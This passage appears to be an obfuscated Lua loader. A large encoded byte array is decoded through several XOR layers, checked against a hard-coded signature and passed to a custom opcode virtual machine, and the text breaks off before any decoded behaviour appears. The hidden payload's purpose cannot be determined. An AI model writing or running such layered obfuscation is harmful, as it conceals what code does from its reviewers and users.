135,247,231,232,209,198,200,61,37,45,16,26,17,119,99,112,82,64,74,172,164,170,157,152,141,252,226,244,220,193,54,32,39,18,7,8,114,102,111,84,91,82,183,186,172,142,132,136,240,250,238,211,217,207,54,56,46,29,1,20,124,96,75,85,71,183,167,163,156,155,147,243,249,239,207,223,206,48,59,41,19,26,2,120,100,118,89,68,75,162,164,161,129,130,243,254,253,211,222,220,55,50,46,8,17,15,113,100,107,91,91,72,180,167,183,146,134,150,251,236,245,222,194,202,33,36,21,29,29,114,124,97,73,89,76,168,184,166,143,159,142,240,251,233,211,218,203,54,36,54,27,4,11,98,101,105,92,94,180,184,160,138,157,129,233,254,231,213,197,204,50,58,49,26,6,13,109,103,111,81,89,67,186,184,172,150,130,148,254,224,213,192,193,54,58,60,16,31,14,104,112,107,79,94,75,174,167,168,147,154,140,242,228,246,220,194,200,34,36,43,1,3,127,96,103,84,89,92,188,184,179,149,159,143,239,254,228,211,219,203,56,58,34,20,4,22,120,101,117,91,75,73,161,160,158,157,157,244,251,225,201,211,204,53,37,42,16,4,11,117,102,112,81,70,73,172,162,171,158,152,140,250,226,244,222,196,43,62,40,10,24,3,119,102,106,85,88,82,180,176,172,142,133,137,237,229,235,209,217,194,61,38,53,31,31,1,117,99,75,95,64,180,167,163,149,155,147,247,252,239,207,221,201,46,38,36,16,26,11,114,103,118,89,69,72,162,167,171,156,158,254,249,253,210,220,193,41,51,47,22,5,7,114,121,113,86,66,77,173,164,175,140,134,131,227,237,235,220,223,192,60,62,22,26,0,106,123,101,73,82,79,181,165,170,145,154,145,246,229,240,208,207,202,44,39,40,29,24,15,119,127,105,94,67,171,188,165,138,152,135,244,230,237,214,219,210,48,57,44,14,14,14,112,122,98,83,89,74,184,184,172,157,129,148,251,227,203,223,198,55,39,41,17,6,7,114,101,107,81,90,81,183,166,176,150,142,138,236,236,234,221,216,200,63,34,52,29,7,117,96,104,74,88,72,180,166,170,149,155,146,243,248,236,206,193,201,48,58,34,19,25,3,120,120,111,87,66,84,184,163,139,154,132,247,231,232,209,198,201,60,37,42,16,26,17,122,123,109,86,71,87,176,164,168,131,129,129,226,234,236,223,222,50,32,38,16,26,28,117,122,109,72,80,71,175,186,169,144,155,143,240,250,227,215,196,214,54,36,43,2,0,9,124,126,84,95,64,170,184,163,137,156,136,232,251,239,209,196,207,48,59,46,20,7,23,112,96,118,90,66,85,182,167,170,129,135,235,249,230,215,199,196,53,56,51,18,30,18,122,124,111,78,70,77,173,164,163,145,153,141,254,230,245,217,193,201,33,35,19,30,29,112,120,124,85,82,83,189,186,172,143,155,140,243,251,233,213,199,215,50,38,54,23,2,21,122,98,106,65,67,171,187,162,151,135,133,245,248,243,208,222,210,49,61,47,14,5,16,112,96,106,76,65,67,190,184,171,159,130,148,254,230,213,192,193,53,39,37,18,27,19,114,112,111,79,95,79,179,187,168,149,135,151,243,225,246,218,195,213,57,32,42,1,4,118,96,97,83,90,92,178,191,179,151,144,146,240,251,239,206,193,208,48,34,42,12,7,10,125,120,106,87,95,77,185,160,139,156,157,244,243,225,201,217,198,53,37,40,18,25,17,119,99,110,77,71,72,172,166,162,131,132,139,252,255,236,220,195,43,61,37,23,7,7,112,102,105,83,69,70,177,186,177,146,133,144,249,224,234,204,199,207,35,33,47,2,0,11,127,126,94,94,93,178,188,161,137,147,142,246,229,239,218,196,205,55,37,48,23,4,23,118,99,107,67,68,75,188,191,168,157,131,235,253,229,215,199,192,52,38,43,19,5,14,113,122,113,81,70,77,173,164,174,145,153,138,251,248,233,217,223,203,56,32,11,26,29,127,125,97,73,82,75,168,176,168,143,145,143,240,251,228,211,218,194,54,36,54,28,6,11,98,100,96,65,70,179,190,189,158,135,128,253,251,243,214,219,204,47,62,36,14,15,8,112,122,98,81,89,67,184,184,173,159,129,148,245,227,203,216,194,55,39,35,22,6,11,125,101,106,86,90,81,177,187,169,153,135,151,246,236,235,195,194,193,34,33,45,31,30,119,126,125,81,93,65,169,191,166,149,133,142,251,228,233,214,197,208,56,39,55,20,2,11,99,109,105,92,95,77,191,163,139,158,132,247,231,228,209,198,200,50,37,43,19,26,17,122,123,110,84,71,87,177,163,182,151,130,149,254,231,234,193,203,53,32,40,30,26,28,118,122,109,72,92,70,175,188,175,144,155,133,240,250,233,214,196,214,63,37,43,2,7,9,124,126,84,95,64,170,185,164,137,152,135,232,240,238,209,196,206,48,38,48,23,3,10,108,102,110,67,70,64,162,161,171,159,158,241,254,253,211,223,193,41,58,42,8,27,9,111,127,105,80,91,72,179,186,162,152,132,150,249,229,235,194,203,200,60,62,18,25,3,106,122,100,73,91,73,181,165,170,146,154,145,246,231,237,205,192,200,49,57,40,26,24,11,121,127,96,94,64,171,185,163,151,135,136,247,251,243,221,218,210,49,49,49,21,4,14,109,102,104,76,76,78,190,184,160,154,159,128,245,254,208,223,195,42,57,34,9,29,7,117,101,108,90,89,81,181,166,173,141,131,143,242,249,238,220,216,192,54,34,52,26,2,117,96,96,86,90,92,183,185,174,136,159,139,239,240,235,206,206,207,51,58,47,17,4,22,125,103,104,66,70,75,161,167,158,128,129,245,249,252,215,198,201,48,56,50,18,24,15,110,101,109,80,90,72,180,164,182,151,133,149,246,228,233,193,192,62,61,61,30,18,28,117,126,109,72,81,75,175,186,165,147,155,140,242,228,247,214,199,203,35,45,43,31,31,13,126,126,83,91,93,182,190,162,137,159,147,240,253,239,207,220,206,46,39,36,13,1,9,114,121,108,67,71,78,191,191,173,157,128,235,249,225,215,199,201,49,59,51,17,29,18,117,127,108,78,64,77,179,186,174,146,132,150,249,231,232,194,197,203,33,33,16,29,29,114,120,98,73,89,77,181,165,166,151,153,145,240,228,240,212,207,215,52,39,40,3,13,21,126,103,105,65,64,177,160,162,150,154,156,240,248,237,200,218,204,47,57,42,19,27,8,120,103,119,80,71,75,163,166,170,159,159,138,249,254,223,219,221,54,59,34,9,29,13,117,101,102,80,89,81,178,161,176,144,142,151,240,230,232,195,192,203,63,63,45,24,3,107,122,98,74,83,72,169,187,170,150,133,138,241,228,233,213,198,208,51,35,55,20,5,11,99,109,107,92,95,65,188,190,149,154,128,234,242,233,212,198,203,54,56,50,18,27,12,110,101,111,77,67,67,172,165,171,157,152,139,252,226,244,213,192,54,32,41,21,7,5,115,102,104,86,91,82,181,184,172,142,142,136,240,250,235,213,217,206,56,56,33,26,1,20,126,126,86,90,64,170,189,164,137,155,142,245,229,236,215,218,209,50,34,48,21,0,10,108,101,104,93,88,79,183,191,161,152,131,235,250,226,202,222,198,41,58,43,22,5,11,113,121,113,86,68,77,173,164,175,140,133,141,227,226,237,220,223,200,60,35,11,25,5,119,103,99,80,70,72,188,165,170,144,154,145,242,229,240,214,192,202,44,37,43,29,24,11,126,98,116,85,70,181,160,165,147,135,137,253,251,243,220,216,204,47,56,47,19,27,15,114,103,119,83,64,86,191,163,181,154,135,138,225,224,214,221,221,63,63,33,9,25,10,104,122,103,79,88,72,176,187,164,141,130,141,241,249,226,223,198,213,63,34,41,1,2,115,126,125,95,89,92,189,178,174,136,153,142,241,228,234,208,198,208,54,37,42,12,13,15,99,97,97,95,95,72,188,160,139,148,128,247,231,231,214,219,211,51,60,50,19,17,17,122,99,110,77,67,74,172,166,175,158,152,137,254,225,244,216,196,43,58,37,20,7,2,116,102,110,82,88,82,177,185,175,142,128,140,240,250,233,212,196,214,55,56,41,23,2,20,116,107,86,64,71,180,186,188,156,158,142,232,252,237,207,208,202,51,59,43,16,4,23,120,101,107,67,67,77,191,191,160,153,158,254,250,253,208,217,194,41,56,46,8,16,10,114,100,105,83,69,80,180,175,183,150,129,136,227,226,235,194,194,206,60,62,19,21,0,106,121,98,84,70,73,183,184,178,147,154,145,244,239,237,205,196,201,50,57,44,29,5,21,122,96,105,65,70,180,160,168,145,154,156,246,249,237,200,223,207,47,58,42,19,27,15,116,122,107,88,89,78,189,166,181,154,159,140,249,227,203,219,193,52,39,35,18,6,13,112,120,114,82,89,81,186,161,173,141,134,137,242,249,227,214,216,202,61,34,52,28,6,107,116,103,87,71,67,183,184,179,144,152,143,239,255,238,211,219,196,50,58,35,23,25,9,124,102,117,95,66,84,188,170,150,128,132,246,249,252,209,210,211,60,61,44,15,17,15,110,100,107,80,90,79,185,164,182,152,140,149,255,230,233,193,202,53,32,40,30,26,28,124,123,109,72,81,71,175,185,174,147,155,136,245,250,235,216,196,214,55,45,40,2,7,9,97,101,82,93,93,183,190,188,145,146,147,245,250,236,207,221,209,48,32,45,13,4,10,114,121,98,95,69,85,188,166,170,129,139,245,224,225,222,218,220,53,56,45,8,25,14,114,100,104,87,70,80,181,164,183,151,141,139,227,226,232,220,223,202,61,35,11,31,4,119,103,101,81,70,79,188,165,171,146,154,145,241,229,240,212,195,202,44,33,47,3,2,14,98,96,109,95,94,176,160,163,144,154,156,243,251,237,200,208,206,50,36,45,22,5,16,116,122,109,86,68,86,189,166,171,130,132,136,252,254,222,217,192,42,60,33,9,24,7,117,101,110,83,90,81,182,166,173,141,132,142,241,249,234,217,216,202,57,63,44,28,0,107,120,125,81,88,65,169,178,166,149,133,139,245,228,232,208,197,208,53,36,55,16,12,11,99,100,107,92,95,72,189,163,139,155,130,247,231,232,215,198,199,60,56,50,22,25,15,110,100,108,80,90,76,181,164,182,155,133,149,254,235,233,193,194,54,62,61,22,26,1,105,123,106,85,69,73,182,164,170,148,155,142,245,228,247,210,217,205,59,37,53,24,3,10,97,102,81,64,73,178,185,188,146,155,147,252,241,239,207,218,196,51,59,42,24,26,3,114,100,118,92,70,85,190,165,169,129,139,246,254,253,211,217,193,41,57,42,21,5,11,119,100,106,85,91,76,181,164,183,149,132,150,251,225,232,194,194,206,33,32,30,0,4,117,121,124,86,70,74,179,184,178,148,145,140,238,230,229,205,197,200,50,57,43,29,24,1,121,98,116,95,64,181,160,166,159,135,129,241,251,243,221,221,210,53,48,44,14,2,15,115,122,111,82,68,86,182,167,168,130,128,140,225,235,208,192,196,52,57,60,23,24,19,118,126,111,79,92,72,174,163,170,141,142,137,242,249,239,221,216,200,56,34,52,31,0,117,96,99,95,71,69,177,184,179,150,152,146,242,240,236,206,196,205,51,58,42,16,4,22,118,102,104,66,65,76,161,161,159,157,157,240,255,226,201,220,205,53,37,40,23,25,17,122,98,112,87,64,87,177,166,168,131,130,139,226,226,239,220,222,55,57,61,22,19,28,113,127,109,72,91,76,175,191,171,147,155,141,243,228,247,214,194,214,60,32,40,2,7,12,97,102,80,64,69,182,185,188,147,155,142,232,252,235,210,196,197,49,59,46,22,7,23,113,102,104,67,66,72,191,191,169,154,131,235,254,231,202,221,198,41,63,45,22,5,8,111,126,101,83,91,73,177,164,183,147,141,150,252,225,235,194,198,201,33,34,17,29,29,112,122,98,73,90,78,181,165,167,151,153,145,240,227,240,210,193,215,56,38,40,3,13,9,127,127,107,88,67,171,188,165,138,157,135,233,254,234,214,197,203,50,57,49,17,0,13,109,98,104,76,65,67,163,167,172,156,159,128,255,254,215,213,192,42,58,32,23,6,9,124,101,107,86,90,81,179,162,176,144,143,138,236,237,234,221,216,207,63,34,52,24,1,118,96,105,85,71,71,179,166,171,144,155,146,243,249,241,219,195,205,45,37,40,12,2,13,99,103,108,92,95,79,188,190,146,154,128,234,253,229,201,219,199,40,49,44,17,4,5,112,123,107,89,71,87,182,164,168,131,129,137,255,255,236,217,192,43,57,36,10,31,8,116,102,102,84,91,82,186,177,177,149,130,141,237,239,232,204,196,205,35,44,45,28,31,10,124,126,81,88,64,170,188,163,137,147,137,232,252,235,209,196,205,51,59,45,24,7,23,117,96,118,90,76,85,186,167,170,129,130,246,224,225,223,218,220,60,51,46,8,31,15,114,100,110,86,69,80,180,165,183,151,130,139,227,230,237,220,223,207,52,62,30,25,0,106,125,101,73,95,73,168,188,172,145,132,143,243,251,229,215,199,215,49,33,54,26,2,21,127,103,106,65,70,171,191,167,151,135,129,240,230,237,220,197,206,55,58,49,22,6,16,113,110,106,76,71,72,189,184,170,158,130,148,251,230,214,192,197,53,39,36,29,27,19,112,122,108,79,94,68,174,174,169,144,154,141,243,249,235,214,216,204,59,33,52,24,30,119,116,96,74,95,69,169,186,166,136,145,141,241,228,238,206,199,197,48,58,43,17,7,22,127,101,104,66,65,76,188,190,149,152,157,242,252,225,201,217,205,54,37,39,26,4,13,119,102,112,83,64,87,184,162,182,159,129,139,226,225,234,220,222,50,56,32,10,25,5,105,121,104,72,89,74,177,164,172,144,155,136,249,231,247,214,197,200,35,37,32,2,5,12,124,126,86,95,93,190,188,161,137,155,143,246,229,232,210,217,209,58,37,45,13,3,8,108,103,98,67,68,72,188,191,173,159,131,235,248,228,215,199,200,48,38,41,19,5,6,113,122,113,86,71,77,173,162,175,145,153,130,251,248,235,214,223,202,62,32,11,24,3,106,114,102,84,70,76,180,187,178,145,159,145,251,228,237,205,206,201,44,34,34,30,24,1,127,97,116,92,66,182,160,165,149,154,156,246,249,243,210,209,210,58,56,47,14,4,13,112,122,111,83,68,86,188,160,181,150,133,148,245,230,213,192,193,52,58,60,18,29,14,104,124,110,81,68,72,178,166,176,151,133,137,236,230,232,195,204,193,63,63,44,20,3,107,122,102,74,94,67,180,166,167,149,133,136,244,228,239,208,197,208,54,47,55,18,6,11,99,102,111,66,75,78,161,164,148,158,157,242,249,225,201,218,204,53,37,46,22,4,13,117,123,108,84,68,87,182,164,182,151,130,136,226,224,225,220,222,48,61,32,10,25,4,116,102,111,86,69,73,187,185,177,147,133,142,237,231,235,209,217,206,60,37,53,29,2,20,121,101,75,90,64,180,167,166,156,134,135,241,248,242,211,222,209,51,32,48,21,2,9,108,109,107,94,88,65,187,162,180,156,131,245,224,229,223,199,194,49,56,51,20,27,18,119,126,108,78,69,69,176,186,163,144,132,150,247,224,232,194,199,204,33,34,31,29,29,116,122,98,73,92,78,181,165,170,150,153,145,242,227,240,208,207,215,57,36,40,3,7,11,127,127,97,88,67,171,180,162,138,158,137,233,243,237,214,197,202,50,36,37,17,6,16,119,102,105,76,70,67,163,172,170,156,159,141,225,231,209,221,221,48,50,33,9,31,13,117,101,109,80,89,81,177,163,176,153,129,138,236,226,227,222,216,203,62,34,52,24,7,118,96,97,82,71,69,188,166,170,149,155,146,241,249,236,206,195,200,48,58,41,20,25,11,118,120,108,92,65,84,184,163,139,158,133,247,231,231,220,219,211,48,49,50,20,27,12,110,111,110,77,78,67,177,185,162,158,134,149,248,225,233,193,196,50,61,61,16,24,28,114,125,115,85,89,76,175,176,164,142,143,136,240,250,238,212,217,205,57,56,40,31,1,20,117,99,86,64,71,178,186,188,147,158,147,243,241,242,215,218,207,46,33,48,19,1,10,108,102,106,93,88,78,185,191,169,153,131,235,249,227,202,222,198,52,38,46,22,27,18,114,122,108,78,79,78,176,186,174,147,153,140,248,248,232,223,193,212,59,43,11,21,5,119,103,97,81,70,78,179,165,170,144,154,145,247,251,234,214,199,215,52,37,40,3,2,1,98,98,109,95,94,191,190,189,148,157,129,233,251,237,214,197,205,50,57,49,19,4,13,109,102,104,76,76,76,190,184,170,159,129,148,244,227,214,192,196,50,58,60,22,25,19,114,126,114,91,91,79,174,167,172,144,154,138,247,228,246,220,193,213,59,36,52,24,1,117,96,98,87,71,64,179,187,179,144,152,140,239,249,236,211,219,202,53,36,55,20,7,22,121,108,104,66,75,73,191,190,145,149,157,242,248,225,201,210,211,50,62,47,15,28,12,112,123,110,80,71,87,182,166,171,131,130,140,226,228,238,193,199,51,62,61,30,26,1,105,114,105,85,69,70,182,164,164,149,155,141,242,228,247,211,217,202,57,37,53,22,2,10,97,102,87,93,93,181,191,162,137,158,147,244,255,239,207,218,204,48,59,47,17,7,23,112,102,107,67,67,72,162,167,175,129,138,245,254,253,209,218,220,51,62,46,8,28,11,111,124,107,78,70,79,179,186,173,145,132,150,251,226,232,194,194,204,33,34,22,29,29,127,121,98,73,92,83,188,177,175,143,157,132,243,251,235,216,218,207,52,36,54,29,6,21,119,107,105,65,67,182,190,189,147,153,129,233,253,235,213,197,202,55,36,40,26,27,9,114,100,119,85,68,86,185,163,168,130,130,141,225,224,222,192,194,53,57,60,19,27,19,112,127,111,79,90,72,174,174,173,144,154,136,245,231,246,223,198,213,62,37,41,1,1,117,126,125,81,82,92,180,190,174,136,155,143,239,255,229,211,219,197,50,36,55,18,7,11,99,108,106,95,95,74,185,190,158,154,157,241,248,226,201,223,205,40,48,40,18,4,12,114,101,112,81,78,87,181,167,168,131,141,149,254,234,233,193,196,62,61,61,21,25,1,105,114,107,86,69,74,177,164,171,149,134,144,249,239,234,204,194,200,62,56,32,28,2,20,120,102,75,92,70,183,167,164,150,152,147,244,251,239,207,209,201,51,59,42,20,26,15,118,121,105,92,70,85,185,191,172,149,131,235,252,225,212,199,200,61,38,42,17,27,18,119,122,113,85,79,77,173,165,171,146,153,141,246,248,237,221,193,212,63,32,11,28,9,119,103,99,84,88,83,182,185,175,143,145,143,243,251,239,210,218,195,55,36,54,30,1,11,98,106,105,92,94,180,187,160,138,155,134,233,255,230,200,208,202,49,36,41,16,27,4,121,103,119,85,76,75,163,160,169,159,159,139,254,224,203,222,221,49,60,33,9,29,14,118,101,107,81,89,81,178,163,174,141,133,137,236,231,237,222,216,192,63,33,52,21,3,118,96,105,84,90,92,183,185,179,157,158,146,246,253,239,206,197,205,48,58,47,23,4,22,126,98,117,87,69,84,189,166,149,128,132,244,231,224,211,219,211,51,48,47,15,30,13,115,123,107,82,68,87,185,167,182,152,131,136,226,231,225,220,222,52,60,32,10,31,3,116,102,110,80,69,78,187,164,169,145,133,144,244,231,234,204,199,201,62,56,42,29,31,1,122,126,95,88,67,170,188,161,137,157,137,245,229,230,214,196,207,58,59,46,18,4,23,115,103,118,89,76,72,162,163,170,159,158,247,254,224,202,219,196,52,38,38,22,5,15,116,100,110,91,70,80,185,167,170,140,140,137,254,248,238,218,223,204,53,62,21,31,3,106,121,97,73,82,75,181,165,172,144,132,140,245,251,239,212,196,215,49,36,54,31,13,8,98,97,109,65,69,176,160,163,146,153,156,253,251,243,221,222,207,47,63,36,19,27,11,120,122,99,82,68,86,190,166,181,152,139,148,245,227,213,192,192,55,58,60,23,25,14,104,112,109,79,95,74,174,167,169,147,154,136,241,249,232,218,197,213,56,32,52,26,4,107,126,101,84,71,69,183,166,167,156,152,146,240,253,241,215,199,205,45,34,47,17,25,13,124,120,109,86,66,84,188,162,149,128,132,244,250,252,212,217,206,40,59,47,15,16,11,110,99,109,83,90,74,177,185,162,154,133,149,254,231,244,223,197,43,56,36,20,7,0,105,121,104,85,69,78,183,164,168,155,155,138,245,228,247,217,217,204,57,37,53,25,10,9,97,101,94,64,73,178,186,188,151,158,147,253,254,242,214,216,207,46,38,46,16,26,11,115,100,118,88,64,85,186,170,180,155,131,245,224,226,202,219,195,52,38,45,18,5,13,122,100,110,87,69,80,177,165,183,153,131,139,227,225,236,194,195,193,33,37,19,29,29,126,121,124,86,82,78,168,187,167,146,132,140,240,230,240,213,197,202,44,34,41,3,7,14,98,98,108,95,94,176,189,160,138,159,133,244,230,233,208,197,200,53,36,43,17,5,16,119,122,108,84,68,86,185,167,181,158,138,148,252,231,213,192,198,52,39,36,29,27,19,113,121,108,79,92,68,174,165,168,144,154,142,236,237,237,222,216,207,63,33,52,20,11,107,124,98,87,71,65,177,166,167,156,133,140,240,250,241,211,197,205,45,37,46,17,25,12,122,120,97,86,95,65,190,160,139,157,130,234,243,228,212,198,203,49,37,45,27,4,9,113,101,112,88,68,87,180,163,171,131,134,136,252,255,233,213,222,62,62,32,10,18,28,124,125,115,83,80,79,175,188,175,147,155,132,243,231,247,217,192,214,62,35,53,23,7,10,97,103,86,64,71,179,186,188,149,156,147,243,241,242,211,219,207,46,37,46,13,4,15,113,121,99,91,88,72,182,191,174,153,128,235,252,224,202,222,200,52,38,39,29,24,18,119,121,108,78,71,79,176,186,171,146,153,140,249,248,235,215,194,212,61,32,22,0,2,115,122,124,93,95,83,176,191,178,155,154,143,238,239,240,208,194,202,44,36,44,3,2,1,98,98,107,95,94,176,160,164,145,154,156,243,250,237,200,209,206,50,36,43,22,6,16,120,103,119,87,66,75,163,161,160,159,159,128,252,227,203,212,196,55,39,35,17,6,15,115,101,104,90,89,81,183,166,173,141,128,136,241,249,239,218,216,201,55,63,45,24,0,107,120,99,74,89,71,180,166,167,144,133,140,243,249,241,215,197,206,45,32,42,12,7,2,126,120,107,94,65,84,186,162,150,128,131,242,250,252,213,223,211,61,62,47,15,26,12,112,123,110,83,71,87,180,160,171,131,135,141,226,231,225,193,198,54,62,61,19,26,1,105,114,107,85,69,75,183,164,174,154,155,143,244,228,247,216,199,214,61,35,40,2,0,13,97,106,86,93,93,183,190,162,137,153,141,232,255,232,210,196,203,51,37,48,25,6,10,108,100,105,94,88,77,187,191,169,149,131,235,244,225,212,199,198,55,59,51,29,29,15,111,112,110,78,65,68,173,162,171,146,153,142,227,237,239,223,223,193,61,32,11,25,9,106,126,100,87,70,79,168,189,168,146,132,140,247,251,238,209,199,215,51,38,40,3,2,13,98,97,110,92,94,179,181,160,138,159,130,244,230,238,215,216,210,52,60,49,17,0,16,113,102,105,76,66,72,190,184,161,154,130,148,255,225,203,220,198,42,60,35,23,6,14,117,101,109,84,89,81,177,166,174,141,134,138,241,249,235,219,198,213,54,33,52,20,10,118,96,100,86,89,92,180,186,174,136,155,138,241,228,232,215,219,205,56,39,55,23,4,8,99,98,96,66,69,77,188,190,147,159,157,241,252,252,209,218,205,40,58,44,18,4,10,116,102,112,83,64,87,180,162,182,156,135,139,226,228,244,217,202,54,32,40,31,26,28,112,122,110,72,88,74,178,164,165,142,143,132,240,250,237,208,199,214,55,37,40,2,6,12,124,126,80,95,93,183,178,161,137,156,134,245,229,236,209,217,209,58,34,45,13,3,14,108,109,98,67,77,75,188,191,174,156,131,235,255,233,215,199,200,48,38,45,28,5,6,119,122,113,81,91,72,183,167,183,149,140,139,227,228,235,223,223,203,57,35,11,31,3,106,126,102,84,70,70,189,184,178,150,153,140,238,238,232,208,218,207,51,57,42,23,5,21,127,97,106,65,70,183,189,189,151,158,129,233,243,234,200,218,201,47,60,41,16,27,14,112,103,119,87,67,75,163,164,172,130,135,137,252,254,210,222,195,42,59,35,9,19,7,117,101,109,90,89,81,181,174,176,146,133,138,236,230,238,195,205,207,63,63,44,20,3,107,117,96,87,71,67,182,187,179,145,154,146,250,255,236,206,197,205,51,58,43,18,4,22,125,96,104,66,70,77,161,161,158,128,133,244,249,252,221,219,211,53,63,47,15,16,9,110,111,108,80,90,79,178,167,182,155,134,149,246,235,233,193,196,54,62,61,16,18,28,125,120,110,72,88,74,175,177,170,147,155,142,248,231,247,210,196,203,35,44,43,31,31,8,123,126,85,84,93,177,184,162,137,159,147,241,254,239,207,222,201,46,39,37,13,5,8,114,121,104,93,88,64,182,162,180,154,130,245,224,230,223,199,200,55,56,51,20,27,18,122,112,108,78,68,77,179,186,171,144,132,150,246,225,232,194,199,204,33,35,31,0,9,119,121,124,87,91,83,182,188,175,143,155,137,238,224,235,205,194,200,50,57,42,29,24,13,121,98,116,94,66,181,160,163,145,135,132,240,248,243,209,197,199,59,57,49,17,6,14,109,97,107,81,89,76,187,166,181,157,130,148,253,234,214,192,195,55,57,60,17,26,14,104,123,107,82,68,75,177,187,169,150,154,139,240,231,246,220,197,213,58,39,41,1,5,115,96,102,80,71,73,183,184,179,144,155,146,244,254,236,206,192,204,51,58,41,24,25,2,125,102,117,93,95,73,181,163,139,153,136,247,231,232,220,198,203,48,59,50,20,28,17,114,111,112,87,69,73,172,163,171,158,152,143,250,226,244,223,193,43,52,39,10,27,1,119,102,108,72,94,77,178,164,171,146,133,144,244,225,247,214,199,200,35,44,43,2,0,14,124,126,81,92,67,170,189,160,148,134,141,247,251,242,208,218,209,55,32,45,13,4,2,113,121,111,94,69,85,182,160,169,129,129,242,224,226,209,199,197,55,56,51,29,5,15,119,121,113,85,66,80,181,160,183,144,129,136,227,228,245,215,199,201,33,32,23,30,29,112,125,124,86,95,77,168,190,172,143,154,133,243,251,238,211,196,215,54,37,43,3,13,13,124,127,110,65,69,176,160,162,148,153,156,242,248,238,200,209,202,50,36,43,17,27,10,118,122,107,83,71,86,191,166,181,156,132,137,225,226,209,192,196,48,39,36,22,24,19,114,123,114,87,94,76,174,174,173,147,154,137,249,249,232,218,198,213,58,63,45,21,3,107,122,96,84,71,64,183,187,179,149,157,143,239,248,239,206,193,202,45,33,34,17,25,9,125,101,117,92,64,73,161,163,145,128,134,240,231,232,215,216,211,48,59,50,27,30,12,110,103,105,77,71,67,172,173,174,157,152,142,252,255,225,219,195,43,56,40,23,7,4,114,102,105,80,91,82,179,186,177,145,143,141,237,238,226,209,217,205,54,56,42,26,2,20,122,96,75,93,72,170,185,161,151,134,138,245,229,230,209,217,209,49,36,48,21,15,23,115,96,104,67,67,85,187,171,169,129,135,247,254,253,212,211,220,55,57,45,8,25,15,111,124,107,83,91,77,179,164,183,144,141,150,249,231,235,194,203,201,33,43,16,29,29,119,122,98,73,92,70,168,186,173,146,132,141,246,251,229,215,218,206,48,39,54,22,24,14,123,98,116,90,65,171,188,168,138,154,133,247,230,230,214,197,199,59,57,49,19,7,14,109,97,99,76,76,78,189,184,173,159,159,139,251,227,203,223,195,52,39,36,20,27,19,118,125,111,79,95,73,174,174,171,141,128,139,242,249,236,221,197,213,56,32,41,1,6,114,96,97,95,71,72,182,184,179,146,155,146,247,253,236,206,194,201,45,36,34,12,6,9,125,120,104,93,95,64,181,163,139,154,128,244,231,229,213,219,211,52,60,44,15,24,8,110,111,100,80,90,74,177,167,182,159,133,136,226,235,236,220,222,53,63,61,17,28,28,119,126,109,72,90,79,178,164,164,151,134,144,249,227,247,208,204,214,59,39,43,2,6,20,123,97,86,64,73,178,167,161,157,134,139,240,251,242,219,196,196,58,38,48,16,6,9,108,98,107,94,88,76,186,161,180,155,134,235,252,232,215,199,199,53,56,51,23,25,15,111,122,110,83,91,69,178,186,171,153,153,136,252,230,245,218,194,201,33,33,18,29,29,116,125,124,83,82,83,179,187,172,143,144,143,238,231,232,208,218,207,48,39,54,23,4,8,98,96,108,92,94,181,189,189,149,147,129,233,248,237,214,197,207,51,57,49,20,4,14,109,111,104,76,77,77,190,184,161,157,129,148,251,224,214,192,193,53,58,60,29,25,19,112,112,114,91,90,79,174,162,173,141,128,143,241,249,238,220,216,205,54,63,33,31,0,107,122,125,94,93,65,169,185,174,150,133,136,243,249,241,211,195,205,45,39,47,12,6,13,126,120,106,92,65,84,184,162,150,128,133,242,250,252,215,217,211,50,62,47,15,31,9,112,123,104,83,71,87,178,160,171,131,141,140,226,229,238,193,202,53,62,61,23,7,0,113,123,115,93,92,82,177,184,172,142,130,142,243,250,235,210,217,200,56,37,53,29,10,9,97,98,85,93,93,182,191,161,137,154,139,232,248,230,207,221,204,48,59,43,19,7,23,120,97,107,67,71,79,162,170,175,129,138,244,254,253,212,219,193,41,63,43,21,5,7,119,100,109,85,91,73,180,164,183,146,153,143,248,229,245,223,202,163};
local _0x6a8a779 = { 57, true };
local _0x213c056 = 248;
local _0xp1 = 27; local _0xp2 = 44; local _0xp3 = 89; local _0xp4 = 100;
local _0xsig = 436821425;

local function _0x_vm(L1Data, Consts, BaseKey, p1, p2, p3, p4, Sig)
    local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or function(a,b)
        local r,p=0,1 while a>0 or b>0 do local ra,rb=a%2,b%2 if ra~=rb then r=r+p end a,b,p=(a-ra)/2,(b-rb)/2,p*2 end return r
    end;

    if Sig ~= 436821425 then
        return function() return 0 end;
    end;

    local s1 = {};
    for i = #L1Data, 1, -1 do
        table.insert(s1, string.char(bxor(L1Data[i], bxor(BaseKey, ((#L1Data - i) * 11) % 256)) % 256));
    end;
    local d2 = (function() local s = table.concat(s1); local t = {}; for n in string.gmatch(s:sub(2, -2), "%d+") do table.insert(t, tonumber(n)) end; return t; end)();

    local s2 = {};
    for i = #d2, 1, -1 do
        local idx = #d2 - i;
        table.insert(s2, string.char(bxor(d2[i], (BaseKey + idx * p4 + (idx * idx % 23)) % 256) % 256));
    end;
    local d3 = (function() local s = table.concat(s2); local t = {}; for n in string.gmatch(s:sub(2, -2), "%d+") do table.insert(t, tonumber(n)) end; return t; end)();

    local s3 = {};
    for i = #d3, 1, -1 do
        local idx = #d3 - i;
        table.insert(s3, string.char(bxor(d3[i], (BaseKey + idx * p3 + (idx * 3 % 19)) % 256) % 256));
    end;
    local d4 = (function() local s = table.concat(s3); local t = {}; for n in string.gmatch(s:sub(2, -2), "%d+") do table.insert(t, tonumber(n)) end; return t; end)();

    local s4 = {};
    for i = #d4, 1, -1 do
        local idx = #d4 - i;
        table.insert(s4, string.char(bxor(d4[i], (BaseKey + idx * p2 + (idx * 7 % 17)) % 256) % 256));
    end;
    local d5 = (function() local s = table.concat(s4); local t = {}; for n in string.gmatch(s:sub(2, -2), "%d+") do table.insert(t, tonumber(n)) end; return t; end)();

    local s5 = {};
    for i = #d5, 1, -1 do
        local idx = #d5 - i;
        table.insert(s5, string.char(bxor(d5[i], (BaseKey + idx * p1 + (idx * idx % 13)) % 256) % 256));
    end;

    local OpaqueMatrix = {
        215,
        126,
        189,
        32
    };

    local Registers = {};
    local PC = 1;
    local Instructions = {
        { op = OpaqueMatrix[1], a = 0, b = 0 },
        { op = OpaqueMatrix[1], a = 1, b = 1 },
        { op = OpaqueMatrix[3], a = 2, b = 1, c = 1 },
        { op = OpaqueMatrix[4], a = 0, b = 0 }
    };

    while PC <= #Instructions do
        local inst = Instructions[PC];
        local op = inst.op;
        if not inst.isJunk then
            if op == OpaqueMatrix[1] then
                Registers[inst.a] = Consts[inst.b + 1];
            elseif op == OpaqueMatrix[2] then
                local vB, vC = Registers[inst.b] or 0, Registers[inst.c] or 0;
